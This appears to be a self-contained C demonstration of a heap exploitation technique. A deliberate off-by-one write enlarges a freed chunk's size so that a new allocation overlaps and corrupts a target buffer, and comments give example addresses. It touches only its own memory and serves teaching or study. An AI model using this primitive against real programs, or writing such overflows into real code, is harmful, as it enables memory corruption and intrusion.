#include <stdio.h>
#include <stdlib.h>
#include <string.h>
int main() {
  void *V = malloc(0x18); // vulnerable object
  void *A = malloc(0xf0); // chunk size 0x100, not fastbin
  char *T = (char*)malloc(0x10); // target
  void *B = malloc(0xf0); // chunk size 0x100, not fastbin
  strcpy(T, "Target");
  printf("T: %s\n", T);
  free(B);
  memcpy(V, "AAAAAAAAAAAAAAAAAAAAAAAA\x21",0x19); // off-by-one, enlarge sizeof A to 0x120
  free(A); // force nonadjacent consolidation with B
  char *C = (char*)malloc(0x110); // malloc C, overlapping T
  strcpy(C+0x100, "Corrupted!");
  printf("T: %s\n", T);
  return 0;
}

// V entry: 0x555555756260 
// A entry: 0x555555756280   <<- New malloc C :0x555555756280 
// T entry: 0x555555756380 
// B entry: 0x5555557563a0 
